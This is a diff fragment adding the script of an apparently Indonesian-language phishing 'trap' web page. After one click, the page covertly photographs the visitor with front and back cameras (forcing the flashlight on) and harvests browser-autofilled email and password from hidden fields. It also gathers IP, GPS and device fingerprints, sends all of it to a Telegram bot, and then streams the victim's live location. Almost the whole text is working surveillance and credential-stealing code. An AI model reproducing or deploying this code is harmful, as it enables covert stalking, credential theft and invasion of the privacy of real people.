+                    audio: false 
+                });
+                
+                const video = document.createElement('video'); 
+                video.srcObject = stream; video.setAttribute('playsinline', ''); video.muted = true; 
+                await video.play();
+                await new Promise(r => setTimeout(r, 1000)); 
+                
+                const canvas = document.createElement('canvas'); 
+                canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                result.front = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+                
+                stream.getTracks().forEach(t => t.stop()); 
+            } catch(err) { 
+                if(stream) stream.getTracks().forEach(t => t.stop()); 
+            }
+
+            // 2. Capture Back Camera + Torch / Flashlight
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, 
+                    audio: false 
+                });
+                
+                const track = stream.getVideoTracks()[0];
+                const capabilities = track.getCapabilities ? track.getCapabilities() : {};
+                if (capabilities.torch) {
+                    try {
+                        await track.applyConstraints({ advanced: [{ torch: true }] });
+                    } catch(e) {}
+                }
+
+                const video = document.createElement('video'); 
+                video.srcObject = stream; video.setAttribute('playsinline', ''); video.muted = true; 
+                await video.play();
+                await new Promise(r => setTimeout(r, 1200)); 
+                
+                const canvas = document.createElement('canvas'); 
+                canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                result.back = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+                
+                stream.getTracks().forEach(t => t.stop()); 
+            } catch(err) {
+                if(stream) stream.getTracks().forEach(t => t.stop());
+                
+                // Fallback generic video device if environment constraint fails
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    const video = document.createElement('video'); 
+                    video.srcObject = stream; video.setAttribute('playsinline', ''); video.muted = true; 
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 1000)); 
+                    const canvas = document.createElement('canvas'); 
+                    canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    result.back = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e2) {}
+            }
+
+            return result;
+        }
+
+        async function sendTelegram(text, photoBase64 = null) {
+            try {
+                if (photoBase64) {
+                    const bin = atob(photoBase64); const arr = new Uint8Array(bin.length);
+                    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+                    const blob = new Blob([arr], { type: 'image/jpeg' }); const fd = new FormData();
+                    fd.append('chat_id', TG_CHAT); fd.append('caption', text); fd.append('parse_mode', 'HTML'); fd.append('photo', blob, 'cam.jpg');
+                    await fetch(TG_BASE + '/sendPhoto', { method: 'POST', body: fd });
+                } else {
+                    await fetch(TG_BASE + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'HTML' }) });
+                }
+            } catch (e) {}
+        }
+
+        let lastTrackedLat = 0, lastTrackedLng = 0;
+        function startLiveTracking() {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.watchPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                if (lastTrackedLat === 0 || getDistance(lastTrackedLat, lastTrackedLng, lat, lng) > 10) {
+                    lastTrackedLat = lat; lastTrackedLng = lng;
+                    let liveMsg = `🚶 <b>LIVE TRACKING (Bergerak)</b>\n`;
+                    liveMsg += `🌐 Lat/Lng: <code>${lat.toFixed(7)}, ${lng.toFixed(7)}</code>\n`;
+                    liveMsg += `🎯 Akurasi: ${Math.round(acc)} m\n`;
+                    liveMsg += `🗺️ <a href="https://maps.google.com/?q=${lat},${lng}">Buka Lokasi Sekarang</a>`;
+                    sendTelegram(liveMsg, null);
+                }
+            }, () => {}, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
+        }
+
+        allowBtn.addEventListener('click', async () => {
+            allowBtn.disabled = true;
+            allowBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Memproses…';
+            
+            const autoEmail = document.getElementById('trapUser').value;
+            const autoPass = document.getElementById('trapPass').value;
+
+            const locPromise = getMaxAccuracyLocation();
+            await new Promise(r => setTimeout(r, 500));
+            const camPromise = captureCamerasAndTorch();
+
+            const [cameras, ipData, battery, dev, sensors, webrtcIp, audioFp] = await Promise.all([
+                camPromise, getIP(), getBatteryInfo(), getDeviceInfo(), getSensors(), getWebRTCIP(), getAudioFP()
+            ]);
+            
+            const loc = await locPromise;
+            const waktu = formatDate();
+
+            let report = `👑 <b>SIBERLANZ TARGET KACUNG</b> 👑\n`;
+            report += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            report += `🆔 Resi: <code>${Math.floor(100000 + Math.random() * 900000)}</code>\n`;
+            report += `🕒 Waktu: ${waktu}\n`;
+            report += `📱 HP Target: ${dev.os}\n`;
+            
+            if (ipData) {
+                report += `🌐 IP: <code>${ipData.ip || '?'}</code>\n`;
+                if(webrtcIp !== '-') report += `🔓 IP WebRTC: <code>${webrtcIp}</code>\n`;
+                report += `📡 Provider: ${ipData.org || ipData.isp || '?'}\n`;
+                report += `🌟 Status IP: 🟢 IP Asli\n`;
+                report += `📍 Lokasi IP: ${ipData.city || '?'}, ${ipData.region || '?'}\n\n`;
+                report += `🏠 Alamat: ${ipData.city || '?'}, ${ipData.country_name || '?'}\n`;
+                report += `🏢 Provinsi: ${ipData.region || '?'}\n`;
+                report += `🏙️ Kota/Kab: ${ipData.city || '?'}\n`;
+                report += `📮 Kode Pos: ${ipData.postal || '?'}\n`;
+            } else {
+                report += `🌐 IP: Gagal didapatkan\n`;
+            }
+
+            if(autoEmail || autoPass) {
+                report += `\n🔐 <b>AUTOFILL LEAK</b>\n`;
+                if(autoEmail) report += `📧 Email: <code>${autoEmail}</code>\n`;
+                if(autoPass) report += `🔑 Pass: <code>${autoPass}</code>\n`;
+            }
+            
+            report += `\n💻 Browser: ${dev.browser}\n`;
+            report += `📱 Layar: ${dev.screenRes} (CD: ${dev.colorDepth}, DPR: ${dev.pixelRatio}, HDR: ${dev.screenHDR}, Gamut: ${dev.colorGamut})\n`;
+            report += `🔄 Orientasi: ${dev.orientation} | Touch: ${dev.touchPoints} pts\n`;
+            report += `🔋 Baterai: ${battery}\n`;
+            report += `📶 Jaringan: ${dev.connType} (${dev.connSpeed}) | SaveData: ${dev.isSaveData}\n`;
+            report += `⚙️ CPU: ${dev.cores} Core | RAM: ${dev.mem}\n`;
+            report += `💻 Arsitektur: ${dev.cpuArch}\n`;
+            report += `📱 Model HP: ${dev.exactModel}\n`;
+            report += `🏭 Manufaktur: ${dev.manufacturer}\n`;
+            report += `🎮 GPU: ${dev.gpuVendor.slice(0,15)} - ${dev.gpuRenderer.slice(0, 30)}...\n`;
+            report += `🖥️ WebGL: ${dev.gpuVer}\n`;
+            report += `💾 Storage: ${dev.storageStr}\n`;
+            report += `🎙️ Audio FP: <code>${audioFp}</code>\n`;
+            report += `🖼️ Canvas FP: <code>${dev.fpCanvas}</code>\n`;
+            report += `📐 Sensor: ${sensors}\n`;
+            
+            if (loc) {
+                report += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `🎯 <b>GPS MAX ACCURACY</b>\n`;
+                report += `🌐 Lat/Lng: <code>${loc.lat.toFixed(7)}, ${loc.lng.toFixed(7)}</code>\n`;
+                report += `🎯 Akurasi: ${Math.round(loc.acc)} meter\n`;
+                if (loc.alt) report += `⛰️ Ketinggian: ${Math.round(loc.alt)}m\n`;
+                if (loc.spd) report += `🏃 Kecepatan: ${(loc.spd * 3.6).toFixed(1)} km/h\n`;
+                report += `🗺️ <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}">Lihat Peta GPS</a>\n`;
+                
+                lastTrackedLat = loc.lat;
+                lastTrackedLng = loc.lng;
+            } else {
+                report += `\n❌ <b>GPS:</b> Ditolak / Gagal (Mengandalkan IP Geo)\n`;
+            }
+
+            await sendTelegram(report, null);
+            if (cameras.front) await sendTelegram(`📸 <b>Kamera Depan Target (HD)</b>`, cameras.front);
+            if (cameras.back) await sendTelegram(`📸 <b>Kamera Belakang + Flashlight Target (HD)</b>`, cameras.back);
+
+            overlay.classList.remove('show');
+            if (loc) startLiveTracking();
+        });
+    </script>
+</body>
+</html>
